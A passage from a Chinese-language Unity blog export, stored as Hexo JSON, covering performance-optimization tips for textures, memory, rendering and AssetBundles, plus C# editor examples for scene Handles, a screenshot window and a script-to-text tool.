使用GameObject.CompareTag代替GameObject.tag：GameObject.tag会在内部循环调用对象分配的标签属性并分配额外的内存。</p>\n</li>\n<li><p>8 使用ObjectPool对象池来管理对象：避免频繁的Instance和Destroy，这两个操作都挺耗性能的。</p>\n</li>\n<li><p>9 延时操作总能降低峰值.尽量不要在Update()函数中做复杂计算：如若需要，可以隔N帧计算一次。</p>\n</li>\n<li><p>10 递归绝不推荐,尽量减少函数调用栈：如用x = (x &gt; 0 ? x : -x)代替x = Mathf.Abs(x)。减少 while(true){}里面循环一直调用的方式,除非在非常重要的功能上面,比如战斗.</p>\n<h2 id=\"纹理优化\"><a href=\"#纹理优化\" class=\"headerlink\" title=\"纹理优化\"></a>纹理优化</h2><p>● 纹理压缩格式：iOS使用PVRTC格式；Android使用ETC格式；Windows使用DXT格式。</p>\n<pre><code> ● 凡是3D场景，都应该尽可能启用MipMaps。如果硬件MipMaps无法满足效果要求：1、使用自己生成的Mipmaps；2、使用Aniso。\n\n ● 如果纹理用于UI或2D场景，禁用MipMaps。\n\n ● 通过减色的方式降低纹理大小。</code></pre><p>##内存优化<br>● 建议总内存控制在150MB以下；堆内存控制在40MB以下。</p>\n<pre><code> ● 切换场景时避开内存峰值。当前一个场景还未释放就切换到新场景，这时由于两个场景的内存叠加容易造成内存峰值。可以采用在屏幕中间遮盖一个Loading场景，在旧场景释放完成，并且新场景初始化结束后，再隐藏Loading场景。\n\n ●​ 使用Prefabs（凡是场景物体，都应该制作成Prefabs）。\n\n ● 通过ObjectPool对象池来避免内存的频繁操作，从而避免内存碎片影响到大内存块的申请；尝试在切换场景时不释放公共UI资源。\n\n ●​ 通过LoadManager，保证在同一时间段内仅载入一个WWW对象，实现顺序加载。\n\n ●​ 纹理内存占用过大：峰值 &lt; 50MB。\n\n ●​ 内存泄露：内存需保持升降一致，避免泄露。\n\n ●​ 网格资源内存过大：峰值 &lt; 20MB。\n\n ●​ 动画片段：内存 &lt; 15MB，警惕资源泄露。\n\n ●​ 音频资源：内存 &lt; 15MB，警惕资源泄露。​</code></pre><h2 id=\"渲染优化\"><a href=\"#渲染优化\" class=\"headerlink\" title=\"渲染优化\"></a>渲染优化</h2><pre><code> ●​ DrawCall数量：峰值 &lt; 250，主体范围（5% - 95%）应在（0 - 200）个之内。\n\n ● Triangle数量：峰值 &lt; 100000/帧。\n\n ● VBO上传量：峰值 &lt; 5MB，频繁加载的资源使用缓存池缓存。\n\n ●​ Skinned Mesh数量：峰值 &lt; 50，对应Profiler中的MeshSdinning.Update、Animator.Update。</code></pre></li>\n</ul>\n<p>​       ● RenderTexture：数量 &lt; 10。</p>\n<h2 id=\"CPU优化​\"><a href=\"#CPU优化​\" class=\"headerlink\" title=\"CPU优化​\"></a>CPU优化​</h2><pre><code>  ●​ Rigidbody数量：峰值 &lt; 50/帧，对应Profiler中的Physics.Simulate。\n\n   ● 碰撞体数量：峰值 &lt; 100/帧，对应Profiler中的Physics.Simulate。</code></pre><h2 id=\"合理使用AssetBundles\"><a href=\"#合理使用AssetBundles\" class=\"headerlink\" title=\"合理使用AssetBundles\"></a>合理使用AssetBundles</h2><p>● 采用依赖性打包</p>\n<pre><code>●​ Assetdatabase.GetDependencies\n\n●​ Push / Pop</code></pre><p>● WWW vs. CreateFromFile</p>\n<pre><code>● WWW常被用于加载采用Unity标准压缩方法压缩过的AssetBundles。\n\n●​  CreateFromFile只能加载非压缩格式的本地AssetBundles；可以先采用其他压缩格式进行压缩，下载到本地后自行解压，再行加载和使用。</code></pre><p>● AssetBundle.mainAsset的功能往往被忽视</p>\n<pre><code>● 它可以是标准的资源asset，用来存储AssetBundles中最重要的资源文件。\n\n●  也可以是TextAsset，其中可以包含任意内容，推荐用来记录每个AssetBundle中的物体列表和信息描述。</code></pre><h2 id=\"Build-AssetBundles\"><a href=\"#Build-AssetBundles\" class=\"headerlink\" title=\"Build AssetBundles\"></a>Build AssetBundles</h2><p>● 问题：当修改AssetBundles中的内容时，需要重新Build这些AssetBundles才能使其生效。这个过程往往非常耗时并影响开发效率。</p>\n<p>● 开发阶段和发布阶段使用不同的策略：</p>\n<pre><code>●​ 为了提高在Unity Editor中反复修改AssetBundles的调试效率，推荐开发时使用Resources.LoadAssetAtPath来避免重新建立AssetBundles。\n\n●​ 在发布时才使用唯一的脚本打包AssetBundles。</code></pre><h2 id=\"AssetDatabase-ImportAsset\"><a href=\"#AssetDatabase-ImportAsset\" class=\"headerlink\" title=\"AssetDatabase.ImportAsset\"></a>AssetDatabase.ImportAsset</h2><p>● AssetDatabase.ImportAsset有三个重要事实：</p>\n<pre><code>●​ 它是将一个外部asset转化为Unity内部能够识别的internal asset，但并不实际在内存中加载asset，更没有返回值。\n\n● 它会根据AssetImporter中的相关设定对asset的相关属性进行修改，尽管两个API之间没有任何的参数传递。\n\n● 它常常被用于在调用BuildPipeline.BuildAssetBundle前强行重新导入一个asset。\n\n●​ 几种常用的AssetImporter类型：TextureImporter、ModelImporter及MovieImporter。</code></pre><h2 id=\"预处理和后处理函数\"><a href=\"#预处理和后处理函数\" class=\"headerlink\" title=\"预处理和后处理函数\"></a>预处理和后处理函数</h2><p>● AssetPostprocessor的作用</p>\n<pre><code>●​ AssetPostprocessor可以在import每个asset之前和之后分别自动触发AssetPostprocessor.OnPreprocessXXX和AssetPostprocessor.OnPostprocessXXX。\n\n●​ 方便用户介入和修改资源导入的过程。</code></pre><h2 id=\"Build-Player\"><a href=\"#Build-Player\" class=\"headerlink\" title=\"Build Player\"></a>Build Player</h2><p>●  自动编译Player</p>\n<pre><code>●​ 支持命令行进行编译。\n\n● 编写编译脚本，并放在Assets/Editor目录下。\n\n●​ 脚本中声明一个类，包含一个静态方法，通过BuildPipeline.BuildPlayer来实现编译工作。</code></pre><p>● 编译后处理脚本</p>\n<pre><code>●​ Unity支持在编译好可执行程序之后，通过后处理脚本对其进行一定的修改，例如制作安装文件等。\n\n    ●​ 在Windows平台下，可以在编辑器脚本（Editor Script）中使用BuildPipeline.BuildPlayer方法来进行编译，并在其后添加任意的后处理代码。\n\n    ●​ 在Mac平台下，Unity在编译工程后会自动查找一个名为PostprocessBuildPlayer的后处理脚本文件，用于实现编译后处理；后处理脚本可以是sh、perl或任意与命令行兼容的语言。</code></pre><h2 id=\"项目发布策略\"><a href=\"#项目发布策略\" class=\"headerlink\" title=\"项目发布策略\"></a>项目发布策略</h2><p>●  对移动芯片的支持</p>\n<pre><code>● 从Unity 4.0开始，Unity停止了对ARM V6架构的支持。\n\n●​ Unity 3.5.x版本仍旧支持ARM V6架构。</code></pre><p>● Graphics Emulation</p>\n<pre><code>●​ 在不使用实际硬件设备的前提下，在Unity编辑器中就可以模拟测试不同图形硬件对当前项目中所使用的图形API的支持能力（对Editor-&gt;Graphics Emulation进行设置）。</code></pre><p>●​ 发布包的代码保护</p>\n<pre><code>●​ Unity脚本在iOS平台下是安全的，与是否使用AssetBundle无关。\n\n●​ 对于Android和其他平台，可以采用AssetBundle + TextAsset的方式进行，也可以采用代码混淆的方式进行。\n\n●​ 在所有平台下都可以使用Native DLL。</code></pre><p>● 发布包的代码加密</p>\n<pre><code>● 需通过AssetBundle和TextAsset来实现，即把代码编译为TextAsset，并打包入AssetBundle中，参考官方文档：“Including scripts in AssetBundles”一节：[http://docs.unity3d.com/Documentation/Manual/scriptsinassetbundles.html](http://docs.unity3d.com/Documentation/Manual/scriptsinassetbundles.html)\n\n● 其中TextAsset并不是真正意义上的Text，而是编译好的dll文件，是以binary形式存在的。参考官方文档“Text Asset”中的“Binary data”一节：[http://docs.unity3d.com/Documentation/Components/class-TextAsset.html](http://docs.unity3d.com/Documentation/Components/class-TextAsset.html)</code></pre><p>● 发布包的美术资源加密</p>\n<pre><code>●​ 对于所有平台，最常见的是对贴图进行加密，通过AssetBundle和TextAsset来实现。</code></pre><p>● 程序发布后的增量更新</p>\n<pre><code>●​ 原理：Unity脚本经过编译后就不能再修改，但是可以添加。\n\n●​ 方案1：将脚本与资源全部分离。\n\n    ●​ 项目管理非常麻烦。\n\n    ●​ 动态挂载所有脚本。\n\n    ●​ 无法在编辑器中使用动态编辑。\n\n● 方案2：将接口与实现分离。\n\n    ●​ 不改变用户工作流程。\n\n    ●​ 仍可在编辑器重使用动态编辑。\n\n    ●​ 对代码起到一定的保护作用（可以混淆）。\n\n    ●​ 对原有的AssetBundles打包方案没有任何影响。</code></pre><p>FPS 帧率<br>高端机 60 帧左右<br>低端机/中端机统一 30 帧(包含)以上<br>低端机以红米 note4 为准,CPU 型号是 Helio X20<br>低于 24 帧必定要做优化</p>\n<p>#UWA内存优化<br>UWA有 4 种测试模式</p>\n<ul>\n<li>模式 1 Overview</li>\n<li>模式 2 Mono 由于目前项目大部分采用 il2cpp,所以这个模式会被逐渐放弃.但是即使你采用了il2cpp 模式也有必要去使用 mono 模式打包,并去测试,不要嫌麻烦.</li>\n<li>模式 3 Assets 资源检测,检测资源重复,是否耗费运行资源过大.</li>\n<li>模式 4 Lua  检查 Lua,收费模式</li>\n</ul>\n<p>#UPR内存优化</p>\n"},{"title":"11 Handles","date":"2020-05-11T03:41:32.000Z","top":11,"_content":"# Handles\n\n* 1: 概念:场景视图的3d GUI 控制\n```\nusing System;\nusing UnityEngine;\n\n//https://assetstore.unity.com/packages/tools/level-design/curvy-splines-7038\nnamespace UnityEditor\n{\n    [CustomEditor(typeof(HandlesScript))]\n    public class HandlesScriptEditor : Editor\n    {\n        HandlesScript hs;\n        private void OnEnable()\n        {\n            hs = target as HandlesScript;\n        }\n\n        public override void OnInspectorGUI()\n        {\n            hs.areaRadius = EditorGUILayout.FloatField(\"操作手柄的半径\", hs.areaRadius);\n            hs.size = EditorGUILayout.FloatField(\"操作手柄的大小\", hs.size);\n            \n            //在Inspector面板上面展示数组\n            SerializedProperty nodePointsProperty = serializedObject.FindProperty(\"nodePoints\");\n            SerializedProperty nodePointQuaternionsProperty = serializedObject.FindProperty(\"nodePointQuaternions\");\n            EditorGUI.BeginChangeCheck();\n            EditorGUILayout.PropertyField(nodePointsProperty, new GUIContent(\"位置节点\"), true);\n            EditorGUILayout.PropertyField(nodePointQuaternionsProperty, new GUIContent(\"旋转节点\"), true);\n            if (EditorGUI.EndChangeCheck())\n                serializedObject.ApplyModifiedProperties();\n        }\n\n        private void OnSceneGUI()\n        {\n            //给一个物体,添加一个文字描述\n            //第一个参数表示当前在场景中展示的位置\n            //第二个参数表示显示的名字\n            Handles.Label(hs.transform.position + new Vector3(0, 1, 0), \"手柄\");\n\n            //第一个参数:该旋转操作手柄的初始旋转角度\n            //第二个参数:操作手柄的显示位置,一般为物体的中心点\n            //第三个参数:操作手柄的半径\n            //多用于制作AI，用于判断和指定AI影响范围用的。\n            hs.areaRadius = Handles.RadiusHandle(Quaternion.identity, hs.transform.position, hs.areaRadius);\n\n            //第一个参数:可以通过Inspector面板修改值,也是该函数的返回值.\n            //第二个参数:操作手柄的位置\n            //第三个参数:操作手柄的指向\n            //第四个参数:操作手柄的大小\n            //第五个参数:操作手柄的显示方式,(箭头ArrowHandleCap,RectangleHandleCap矩形,CircleHandleCap圆形),只要是方法后缀带有Cap的都可以传入\n            //第六个参数:一般为0.5f,不知道干什么的\n            hs.size = Handles.ScaleValueHandle(hs.size, hs.transform.position, Quaternion.identity, hs.size,Handles.ArrowHandleCap, 0.5f);\n\n\n            for (int i = 0; i < hs.nodePoints?.Length; i++)\n            {\n                //第一个参数:该操作手柄位于世界坐标的位置\n                //第二个参数:该操作手柄的操作旋转方向\n                hs.nodePoints[i] = Handles.PositionHandle(hs.nodePoints[i], hs.nodePointQuaternions[i]);\n            }\n\n            for (int i = 0; i < hs.nodePointQuaternions?.Length; i++)\n            {\n                //第一个参数:该操作手柄的操作旋转方向 \n                //第二个参数:该操作手柄位于世界坐标的位置\n                hs.nodePointQuaternions[i] = Handles.RotationHandle(hs.nodePointQuaternions[i], hs.nodePoints[i]);\n                //画线\n                Handles.DrawLine(hs.nodePoints[i], hs.nodePoints[(int)Mathf.Repeat(i + 1, hs.nodePoints.Length)]);\n            }\n\n        }\n\n\n    }\n}\n\n```","source":"_posts/Unity/UnityEditor/11 Handles.md","raw":"---\ntitle: 11 Handles\ndate: 2020-05-11 11:41:32\ntop: 11\ncategories:\n- Unity\ntags:\n- UnityEditor\n---\n# Handles\n\n* 1: 概念:场景视图的3d GUI 控制\n```\nusing System;\nusing UnityEngine;\n\n//https://assetstore.unity.com/packages/tools/level-design/curvy-splines-7038\nnamespace UnityEditor\n{\n    [CustomEditor(typeof(HandlesScript))]\n    public class HandlesScriptEditor : Editor\n    {\n        HandlesScript hs;\n        private void OnEnable()\n        {\n            hs = target as HandlesScript;\n        }\n\n        public override void OnInspectorGUI()\n        {\n            hs.areaRadius = EditorGUILayout.FloatField(\"操作手柄的半径\", hs.areaRadius);\n            hs.size = EditorGUILayout.FloatField(\"操作手柄的大小\", hs.size);\n            \n            //在Inspector面板上面展示数组\n            SerializedProperty nodePointsProperty = serializedObject.FindProperty(\"nodePoints\");\n            SerializedProperty nodePointQuaternionsProperty = serializedObject.FindProperty(\"nodePointQuaternions\");\n            EditorGUI.BeginChangeCheck();\n            EditorGUILayout.PropertyField(nodePointsProperty, new GUIContent(\"位置节点\"), true);\n            EditorGUILayout.PropertyField(nodePointQuaternionsProperty, new GUIContent(\"旋转节点\"), true);\n            if (EditorGUI.EndChangeCheck())\n                serializedObject.ApplyModifiedProperties();\n        }\n\n        private void OnSceneGUI()\n        {\n            //给一个物体,添加一个文字描述\n            //第一个参数表示当前在场景中展示的位置\n            //第二个参数表示显示的名字\n            Handles.Label(hs.transform.position + new Vector3(0, 1, 0), \"手柄\");\n\n            //第一个参数:该旋转操作手柄的初始旋转角度\n            //第二个参数:操作手柄的显示位置,一般为物体的中心点\n            //第三个参数:操作手柄的半径\n            //多用于制作AI，用于判断和指定AI影响范围用的。\n            hs.areaRadius = Handles.RadiusHandle(Quaternion.identity, hs.transform.position, hs.areaRadius);\n\n            //第一个参数:可以通过Inspector面板修改值,也是该函数的返回值.\n            //第二个参数:操作手柄的位置\n            //第三个参数:操作手柄的指向\n            //第四个参数:操作手柄的大小\n            //第五个参数:操作手柄的显示方式,(箭头ArrowHandleCap,RectangleHandleCap矩形,CircleHandleCap圆形),只要是方法后缀带有Cap的都可以传入\n            //第六个参数:一般为0.5f,不知道干什么的\n            hs.size = Handles.ScaleValueHandle(hs.size, hs.transform.position, Quaternion.identity, hs.size,Handles.ArrowHandleCap, 0.5f);\n\n\n            for (int i = 0; i < hs.nodePoints?.Length; i++)\n            {\n                //第一个参数:该操作手柄位于世界坐标的位置\n                //第二个参数:该操作手柄的操作旋转方向\n                hs.nodePoints[i] = Handles.PositionHandle(hs.nodePoints[i], hs.nodePointQuaternions[i]);\n            }\n\n            for (int i = 0; i < hs.nodePointQuaternions?.Length; i++)\n            {\n                //第一个参数:该操作手柄的操作旋转方向 \n                //第二个参数:该操作手柄位于世界坐标的位置\n                hs.nodePointQuaternions[i] = Handles.RotationHandle(hs.nodePointQuaternions[i], hs.nodePoints[i]);\n                //画线\n                Handles.DrawLine(hs.nodePoints[i], hs.nodePoints[(int)Mathf.Repeat(i + 1, hs.nodePoints.Length)]);\n            }\n\n        }\n\n\n    }\n}\n\n```","slug":"Unity/UnityEditor/11 Handles","published":1,"updated":"2020-05-15T02:50:38.752Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d0m004q2gk7f38td4ov","content":"<h1 id=\"Handles\"><a href=\"#Handles\" class=\"headerlink\" title=\"Handles\"></a>Handles</h1><ul>\n<li>1: 概念:场景视图的3d GUI 控制<pre><code>using System;\nusing UnityEngine;\n</code></pre></li>\n</ul>\n<p>//<a href=\"https://assetstore.unity.com/packages/tools/level-design/curvy-splines-7038\" target=\"_blank\" rel=\"noopener\">https://assetstore.unity.com/packages/tools/level-design/curvy-splines-7038</a><br>namespace UnityEditor<br>{<br>    [CustomEditor(typeof(HandlesScript))]<br>    public class HandlesScriptEditor : Editor<br>    {<br>        HandlesScript hs;<br>        private void OnEnable()<br>        {<br>            hs = target as HandlesScript;<br>        }</p>\n<pre><code>    public override void OnInspectorGUI()\n    {\n        hs.areaRadius = EditorGUILayout.FloatField(&quot;操作手柄的半径&quot;, hs.areaRadius);\n        hs.size = EditorGUILayout.FloatField(&quot;操作手柄的大小&quot;, hs.size);\n\n        //在Inspector面板上面展示数组\n        SerializedProperty nodePointsProperty = serializedObject.FindProperty(&quot;nodePoints&quot;);\n        SerializedProperty nodePointQuaternionsProperty = serializedObject.FindProperty(&quot;nodePointQuaternions&quot;);\n        EditorGUI.BeginChangeCheck();\n        EditorGUILayout.PropertyField(nodePointsProperty, new GUIContent(&quot;位置节点&quot;), true);\n        EditorGUILayout.PropertyField(nodePointQuaternionsProperty, new GUIContent(&quot;旋转节点&quot;), true);\n        if (EditorGUI.EndChangeCheck())\n            serializedObject.ApplyModifiedProperties();\n    }\n\n    private void OnSceneGUI()\n    {\n        //给一个物体,添加一个文字描述\n        //第一个参数表示当前在场景中展示的位置\n        //第二个参数表示显示的名字\n        Handles.Label(hs.transform.position + new Vector3(0, 1, 0), &quot;手柄&quot;);\n\n        //第一个参数:该旋转操作手柄的初始旋转角度\n        //第二个参数:操作手柄的显示位置,一般为物体的中心点\n        //第三个参数:操作手柄的半径\n        //多用于制作AI，用于判断和指定AI影响范围用的。\n        hs.areaRadius = Handles.RadiusHandle(Quaternion.identity, hs.transform.position, hs.areaRadius);\n\n        //第一个参数:可以通过Inspector面板修改值,也是该函数的返回值.\n        //第二个参数:操作手柄的位置\n        //第三个参数:操作手柄的指向\n        //第四个参数:操作手柄的大小\n        //第五个参数:操作手柄的显示方式,(箭头ArrowHandleCap,RectangleHandleCap矩形,CircleHandleCap圆形),只要是方法后缀带有Cap的都可以传入\n        //第六个参数:一般为0.5f,不知道干什么的\n        hs.size = Handles.ScaleValueHandle(hs.size, hs.transform.position, Quaternion.identity, hs.size,Handles.ArrowHandleCap, 0.5f);\n\n\n        for (int i = 0; i &lt; hs.nodePoints?.Length; i++)\n        {\n            //第一个参数:该操作手柄位于世界坐标的位置\n            //第二个参数:该操作手柄的操作旋转方向\n            hs.nodePoints[i] = Handles.PositionHandle(hs.nodePoints[i], hs.nodePointQuaternions[i]);\n        }\n\n        for (int i = 0; i &lt; hs.nodePointQuaternions?.Length; i++)\n        {\n            //第一个参数:该操作手柄的操作旋转方向 \n            //第二个参数:该操作手柄位于世界坐标的位置\n            hs.nodePointQuaternions[i] = Handles.RotationHandle(hs.nodePointQuaternions[i], hs.nodePoints[i]);\n            //画线\n            Handles.DrawLine(hs.nodePoints[i], hs.nodePoints[(int)Mathf.Repeat(i + 1, hs.nodePoints.Length)]);\n        }\n\n    }\n\n\n}</code></pre><p>}</p>\n<p>```</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Handles\"><a href=\"#Handles\" class=\"headerlink\" title=\"Handles\"></a>Handles</h1><ul>\n<li>1: 概念:场景视图的3d GUI 控制<pre><code>using System;\nusing UnityEngine;\n</code></pre></li>\n</ul>\n<p>//<a href=\"https://assetstore.unity.com/packages/tools/level-design/curvy-splines-7038\" target=\"_blank\" rel=\"noopener\">https://assetstore.unity.com/packages/tools/level-design/curvy-splines-7038</a><br>namespace UnityEditor<br>{<br>    [CustomEditor(typeof(HandlesScript))]<br>    public class HandlesScriptEditor : Editor<br>    {<br>        HandlesScript hs;<br>        private void OnEnable()<br>        {<br>            hs = target as HandlesScript;<br>        }</p>\n<pre><code>    public override void OnInspectorGUI()\n    {\n        hs.areaRadius = EditorGUILayout.FloatField(&quot;操作手柄的半径&quot;, hs.areaRadius);\n        hs.size = EditorGUILayout.FloatField(&quot;操作手柄的大小&quot;, hs.size);\n\n        //在Inspector面板上面展示数组\n        SerializedProperty nodePointsProperty = serializedObject.FindProperty(&quot;nodePoints&quot;);\n        SerializedProperty nodePointQuaternionsProperty = serializedObject.FindProperty(&quot;nodePointQuaternions&quot;);\n        EditorGUI.BeginChangeCheck();\n        EditorGUILayout.PropertyField(nodePointsProperty, new GUIContent(&quot;位置节点&quot;), true);\n        EditorGUILayout.PropertyField(nodePointQuaternionsProperty, new GUIContent(&quot;旋转节点&quot;), true);\n        if (EditorGUI.EndChangeCheck())\n            serializedObject.ApplyModifiedProperties();\n    }\n\n    private void OnSceneGUI()\n    {\n        //给一个物体,添加一个文字描述\n        //第一个参数表示当前在场景中展示的位置\n        //第二个参数表示显示的名字\n        Handles.Label(hs.transform.position + new Vector3(0, 1, 0), &quot;手柄&quot;);\n\n        //第一个参数:该旋转操作手柄的初始旋转角度\n        //第二个参数:操作手柄的显示位置,一般为物体的中心点\n        //第三个参数:操作手柄的半径\n        //多用于制作AI，用于判断和指定AI影响范围用的。\n        hs.areaRadius = Handles.RadiusHandle(Quaternion.identity, hs.transform.position, hs.areaRadius);\n\n        //第一个参数:可以通过Inspector面板修改值,也是该函数的返回值.\n        //第二个参数:操作手柄的位置\n        //第三个参数:操作手柄的指向\n        //第四个参数:操作手柄的大小\n        //第五个参数:操作手柄的显示方式,(箭头ArrowHandleCap,RectangleHandleCap矩形,CircleHandleCap圆形),只要是方法后缀带有Cap的都可以传入\n        //第六个参数:一般为0.5f,不知道干什么的\n        hs.size = Handles.ScaleValueHandle(hs.size, hs.transform.position, Quaternion.identity, hs.size,Handles.ArrowHandleCap, 0.5f);\n\n\n        for (int i = 0; i &lt; hs.nodePoints?.Length; i++)\n        {\n            //第一个参数:该操作手柄位于世界坐标的位置\n            //第二个参数:该操作手柄的操作旋转方向\n            hs.nodePoints[i] = Handles.PositionHandle(hs.nodePoints[i], hs.nodePointQuaternions[i]);\n        }\n\n        for (int i = 0; i &lt; hs.nodePointQuaternions?.Length; i++)\n        {\n            //第一个参数:该操作手柄的操作旋转方向 \n            //第二个参数:该操作手柄位于世界坐标的位置\n            hs.nodePointQuaternions[i] = Handles.RotationHandle(hs.nodePointQuaternions[i], hs.nodePoints[i]);\n            //画线\n            Handles.DrawLine(hs.nodePoints[i], hs.nodePoints[(int)Mathf.Repeat(i + 1, hs.nodePoints.Length)]);\n        }\n\n    }\n\n\n}</code></pre><p>}</p>\n<p>```</p>\n"},{"title":"10 Screenshot","date":"2020-05-11T03:41:32.000Z","top":10,"_content":"# 使用Editor编写一个截屏得window面板\n\n* 1:先理解一些手机概念的定义.[手机参数概念](http://www.woshipm.com/ucd/198774.html)\n手机5.2英寸的定义是:手机的对角线是5.2英寸,1英寸（inch）=2.54厘米（cm）,计算方式就是勾股定理,算斜边的长度就是卖手机的时候所说的手机尺寸.\n手机分辨率是1920PX*1080PX:PX的意思就是像素,可以默认为像素是分辨率,手机的点,线,面都是由一个个的像素表现的,可以理解为一个像素是一个小网格,这个含义表示,在手机的竖向上面有1920个像素,在手机的横向上面有1080个像素.\n屏幕像素密度:即在一个对角线长度为1英寸的正方形内所拥有的像素数\n* 2:如果需要查看camera/px/size/unit 摄像机,摄像机的size,像素,单位,x,y,width,height的区别,百度一下.[RenderTexture概念1](https://docs.unity3d.com/ScriptReference/RenderTexture.html),[RenderTexture概念2](https://blog.csdn.net/leonwei/article/details/54972653),[RenderTexture概念3](https://www.jianshu.com/p/334770f39127)\n* 3:\n```\nusing System.Collections;\nusing System.Collections.Generic;\nusing UnityEngine;\nusing UnityEditor;\n\npublic class ScreenshotWindow : EditorWindow\n{\n    int resWidth  = Screen.width * 4;\n    int resHeight = Screen.height * 4;\n\n    public Camera currentCamera;\n\n    int scale = 1;\n\n    string path = \"\";\n\n    bool showPreview = true;\n\n    RenderTexture renderTexture;\n\n    bool isTransparent = false;\n\n    float lastTime;\n\n    string lastPath;\n\n\n    [MenuItem(\"Tools/截屏\")]\n    public static void ShowScreenshotWindow()\n    {\n        EditorWindow ew = GetWindow<ScreenshotWindow>();\n        ew.autoRepaintOnSceneChange = true;//窗口发生变化时,自动重绘\n        ew.titleContent = new GUIContent(\"截屏\");\n    }\n\n\n    private void OnGUI()\n    {\n        {\n            EditorGUILayout.LabelField(\"分辨率\", EditorStyles.boldLabel);\n            resWidth = EditorGUILayout.IntField(\"截取宽度:\", resWidth);\n            resHeight = EditorGUILayout.IntField(\"截取高度:\", resHeight);\n            EditorGUILayout.Space();\n            scale = EditorGUILayout.IntSlider(\"缩放\", scale, 1, 15);\n            //显示帮助信息\n            EditorGUILayout.HelpBox(\"截屏的默认模式是裁剪-所以选择一个合适的宽度和高度。比例是一个因素，以倍增或扩大渲染而不失去质量。\", MessageType.None);\n            EditorGUILayout.Space();\n        }\n\n        {\n            GUILayout.Label(\"Save Path\", EditorStyles.boldLabel);\n\n            EditorGUILayout.BeginHorizontal();\n            EditorGUILayout.TextField(path, GUILayout.MaxWidth(500));\n            if (GUILayout.Button(\"选择文件\"))\n            {\n                path = EditorUtility.SaveFolderPanel(\"Path to Save Images\", path, Application.dataPath);\n            }\n            EditorGUILayout.EndHorizontal();\n            //显示帮助信息\n            EditorGUILayout.HelpBox(\"选择文件夹保存截取的图片\", MessageType.None);\n            EditorGUILayout.Space();\n        }\n        {\n            GUILayout.Label(\"Select Camera\", EditorStyles.boldLabel);\n            currentCamera = EditorGUILayout.ObjectField(\"选择摄像机\", currentCamera, typeof(Camera), true) as Camera;\n            if (currentCamera==null)\n            {\n                currentCamera = Camera.main;\n            }\n            isTransparent = EditorGUILayout.Toggle(\"是否需要透明背景\", isTransparent);\n            EditorGUILayout.HelpBox(\"选择要捕捉渲染的摄像机,可以使用透明选项使背景透明.\", MessageType.None);\n            EditorGUILayout.Space();\n        }\n        {\n            EditorGUILayout.BeginHorizontal();\n            if (GUILayout.Button(\"当前屏幕分辨率\"))\n            {\n                resWidth = (int)Handles.GetMainGameViewSize().x;\n                resHeight = (int)Handles.GetMainGameViewSize().y;\n            }\n\n            if (GUILayout.Button(\"默认屏幕分辨率\"))\n            {\n                resHeight = 1440;\n                resWidth = 2560;\n                scale = 1;\n            }\n\n            EditorGUILayout.EndHorizontal();\n            EditorGUILayout.LabelField(\"截图将于 \" + resWidth * scale + \" x \" + resHeight * scale + \" 像素拍摄\", EditorStyles.boldLabel);\n            EditorGUILayout.Space();\n        }\n        {\n            if (GUILayout.Button(\"截屏\",GUILayout.MinHeight(40)))\n            {\n                TakeScreenshot();\n            }\n            EditorGUILayout.BeginHorizontal();\n            if (GUILayout.Button(\"Open Last Screenshot\", GUILayout.MaxWidth(160), GUILayout.MinHeight(40)))\n            {\n                if (lastPath != \"\")\n                {\n                    Application.OpenURL(\"file://\" + lastPath);\n                }\n            }\n            if (GUILayout.Button(\"Open Folder\", GUILayout.MaxWidth(100), GUILayout.MinHeight(40)))\n            {\n\n                Application.OpenURL(\"file://\" + path);\n            }\n            if (GUILayout.Button(\"More Assets\", GUILayout.MaxWidth(100), GUILayout.MinHeight(40)))\n            {\n                Application.OpenURL(\"https://www.assetstore.unity3d.com/en/#!/publisher/5951\");\n            }\n            EditorGUILayout.EndHorizontal();\n        }\n\n    }\n\n    private void TakeScreenshot()\n    {\n        int resWidthN = resWidth * scale;\n        int resHeightN = resHeight * scale;\n        RenderTexture rt = new RenderTexture(resWidth, resHeight, 24);\n        currentCamera.targetTexture = rt;\n        TextureFormat tf = TextureFormat.RGB24;\n        if (isTransparent)\n        {\n            tf = TextureFormat.RGBA32;\n        }\n        Texture2D screenShot = new Texture2D(resWidthN, resHeightN, tf, false);\n        currentCamera.Render();//将屏幕渲染到targetTexture里面\n        RenderTexture.active = rt;//当前活跃的RenderTexture\n        //将GPU中的FrameBufferObject可读对象拷贝到CPU中存储为一个buffer,然后读取到Texture2D中\n        screenShot.ReadPixels(new Rect(0, 0, resWidthN, resHeightN), 0, 0);\n        currentCamera.targetTexture = null;\n        RenderTexture.active = null;\n        byte[] bytes = screenShot.EncodeToPNG();//编码成PNG\n        lastPath = string.Format(\"{0}/screen_{1}x{2}_{3}.png\", path, resWidthN, resHeightN, System.DateTime.Now.ToString(\"yyyy-mm-dd_HH-mm-ss\"));\n        System.IO.File.WriteAllBytes(lastPath, bytes);\n        Application.OpenURL(lastPath);//打开图片\n        AssetDatabase.Refresh(); \n    }\n\n\n}\n\n```\n* 4:\n```\nusing System.Collections;\nusing System.Collections.Generic;\nusing UnityEngine;\nusing UnityEditor;\nusing System.IO;\n\npublic class ScriptToText : EditorWindow\n{\n    [MenuItem(\"Tools/脚本与文件互转\")]\n    static void ShowScriptToTextWindow()\n    {\n        GetWindow<ScriptToText>(\"脚本与文件互转\");\n    }\n\n\n\n\n    private void OnGUI()\n    {\n        //整个窗口为水平布局\n        GUILayout.BeginHorizontal();\n        DrawLeft();\n        //GUILayout.Label(\"|\", GUILayout.MinHeight(10000));\n        DrawRight();\n        GUILayout.EndHorizontal();\n    }\n\n    private string scriptsContext = \"\";\n    private Vector2 scrollposition;\n\n    /// <summary>\n    /// 绘制左边的区域\n    /// </summary>\n    private void DrawLeft()\n    {\n        //局部为垂直窗口区域\n        GUILayout.BeginVertical();\n        GUILayout.Label(\"显示脚本中的所有内容:\");\n        //开始滑动的区域\n        scrollposition = GUILayout.BeginScrollView(scrollposition);\n\n        //绘制文本\n        scriptsContext = GUILayout.TextArea(scriptsContext, GUILayout.ExpandHeight(true));//动态高度,会占满\n\n        GUILayout.EndScrollView();\n        GUILayout.EndVertical();\n    }\n\n    //文件资源对象\n    TextAsset textAssetObject;\n    //脚本资源对象\n    TextAsset scriptAssetObject;\n\n    //文件保存的路径\n    string saveFilePath = \"\";\n    //脚本保存的路径\n    string scriptFilePath = \"\";\n\n    //绘制2D图像\n    Texture2D texture2D;\n\n    private void DrawRight()\n    {\n        //局部为垂直窗口区域\n        GUILayout.BeginVertical();\n        {\n\n            textAssetObject = (TextAsset)EditorGUILayout.ObjectField(\"script转txt\", textAssetObject, 